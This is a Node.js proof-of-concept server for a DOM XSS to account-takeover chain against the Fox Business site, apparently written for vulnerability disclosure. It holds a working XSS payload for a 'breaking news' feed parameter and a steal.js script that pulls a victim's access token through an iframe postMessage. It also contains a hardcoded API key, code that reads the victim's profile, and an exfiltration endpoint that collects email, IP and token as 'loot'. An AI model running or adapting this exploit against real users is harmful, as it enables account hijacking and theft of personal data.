/**
 * Fox Business DOM XSS → Account Takeover PoC Server
 * Attack: XSS loads /steal.js which sends postMessage to xd-channel iframe,
 * steals access token, calls Fox API, exfiltrates account data.
 */
const http = require('http');
const fs = require('fs');
const path = require('path');
const { URL } = require('url');

const PORT = process.env.PORT || 3000;
const PUBLIC_DIR = path.join(__dirname, 'public');
const SELF = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
const loot = [];

const server = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  const urlPath = req.url.split('?')[0];

  // ── /steal.js — the ATO payload loaded by XSS ─────────────────────
  if (urlPath === '/steal.js') {
    res.setHeader('Content-Type', 'application/javascript');
    res.setHeader('Cache-Control', 'no-cache');
    res.writeHead(200);
    res.end(`
(async function(){
  try {
    var SERVER = '${SELF}';

    // Step 1: Request token from xd-channel iframe via postMessage
    var tokenData = await new Promise(function(ok, fail) {
      var t = setTimeout(function(){ fail('timeout') }, 8000);
      window.addEventListener('message', function h(e) {
        if (e.origin !== 'https://my.foxbusiness.com') return;
        try {
          var d = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
          if (d.name === 'silentLogin' && d.data && d.data.token) {
            clearTimeout(t);
            window.removeEventListener('message', h);
            ok(d.data);
          }
        } catch(x) {}
      });
      var f = document.getElementById('xdchannel');
      if (!f) {
        f = document.createElement('iframe');
        f.id = 'xdchannel';
        f.src = 'https://my.foxbusiness.com/xd-channel.html?_x_auth=foxid&';
        f.style.display = 'none';
        document.body.appendChild(f);
        f.onload = function() {
          f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'silentLogin',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
          f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'hasPendingPasswordless',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
        };
      } else {
        f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'silentLogin',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
        f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'hasPendingPasswordless',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
      }
    });

    // Step 2: Decode JWT to get profileId
    var tk = tokenData.token;
    var parts = tk.split('.');
    var payload = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
    var profileId = payload.uid;

    // Step 3: Call Fox API to read victim profile
    var r = await fetch('https://api3.fox.com/v2.0/update/' + profileId, {
      headers: {
        'Authorization': 'Bearer ' + tk,
        'x-api-key': '4DfS6SQQBOoc2xImxylIam2ri8TXdHQV'
      }
    });
    var profile = await r.json();

    // Step 4: Exfiltrate to attacker
    await fetch(SERVER + '/exfil', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        token: tk,
        profileId: profile.profileId,
        email: profile.email,
        displayName: profile.displayName,
        firstName: profile.firstName,
        viewerId: profile.viewerId,
        ipAddress: profile.ipAddress,
        domain: document.domain
      })
    });

    // Visual proof
    document.title = 'ATO: ' + profile.email;
    var b = document.createElement('div');
    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;background:#d32f2f;color:#fff;padding:16px;font:bold 16px system-ui;text-align:center';
    b.textContent = 'Account Takeover - Stolen: ' + profile.email;
    document.body.prepend(b);

  } catch(e) {
    new Image().src = '${SELF}/exfil?err=' + encodeURIComponent(e);
  }
})();
`);
    return;
  }

  // ── Exfil endpoint ─────────────────────────────────────────────────
  if (urlPath === '/exfil') {
    if (req.method === 'POST') {
      let body = '';
      req.on('data', c => body += c);
      req.on('end', () => {
        try {
          const data = JSON.parse(body);
          data._ts = new Date().toISOString();
          data._ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
          loot.push(data);
          if (loot.length > 50) loot.shift();
          console.log(`[LOOT] ${data.email || 'unknown'} | ${data.profileId || '?'}`);
        } catch(e) {}
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end('{"ok":true}');
      });
      return;
    }
    const qs = new URL(req.url, 'http://x').searchParams;
    if (qs.has('err')) console.log(`[ERR] ${qs.get('err')}`);
    res.writeHead(200, { 'Content-Type': 'image/gif' });
    res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
    return;
  }

  // ── View stolen data ───────────────────────────────────────────────
  if (urlPath === '/loot') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(loot, null, 2));
    return;
  }

  // ── ATO payload — loads external /steal.js to avoid encoding hell ──
  if (urlPath === '/' || urlPath === '/payload.json' || urlPath === '/vercel.json' || urlPath === '/breaking.json') {
    const payload = {
      data: {
        status: { success: true, code: 200 },
        existing_total: 1,
        results: [{
          publication_date: new Date().toISOString(),
          eyebrow: '',
          'main-content': [{
            component: 'BreakingNews',
            model: {
              url: 'https://www.foxbusiness.com/markets',
              headline: "<img src=x onerror=\"var s=document.createElement('script');s.src='" + SELF + "/steal.js';document.head.appendChild(s)\">",
              bannerType: 'BreakingNews'
            }
          }]
        }]
      }
    };
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Cache-Control', 'no-cache, no-store');
    res.writeHead(200);
    res.end(JSON.stringify(payload));
    return;
  }

  // ── Alert-only ─────────────────────────────────────────────────────
  if (urlPath === '/alert') {
    res.setHeader('Content-Type', 'application/json');
    res.writeHead(200);
    res.end(JSON.stringify({ data: { status: { success: true, code: 200 }, existing_total: 1,
      results: [{ publication_date: new Date().toISOString(),
        'main-content': [{ component: 'BreakingNews',
          model: { url: 'https://www.foxbusiness.com/', headline: '<img src=x onerror=alert(document.domain)>', bannerType: 'BreakingNews' } }] }] } }));
    return;
  }

  // ── Static files ───────────────────────────────────────────────────
  const safePath = path.normalize(urlPath).replace(/^(\.\.(\/|\\|$))+/, '');
  const filePath = path.join(PUBLIC_DIR, safePath);
  if (!filePath.startsWith(PUBLIC_DIR)) { res.writeHead(403); res.end(); return; }
  fs.readFile(filePath, (err, data) => {
    if (err) { res.writeHead(404); res.end(); return; }
    const ext = path.extname(filePath);
    const types = { '.html': 'text/html', '.json': 'application/json', '.js': 'application/javascript' };
    res.setHeader('Content-Type', types[ext] || 'application/octet-stream');
    res.writeHead(200);
    res.end(data);
  });
});

server.listen(PORT, () => {
  console.log(`\n  ATO server: ${SELF}`);
  console.log(`  Trigger:    https://www.foxbusiness.com/?_breaking_feed_url=${SELF}/vercel.json`);
  console.log(`  Loot:       ${SELF}/loot\n`);
});
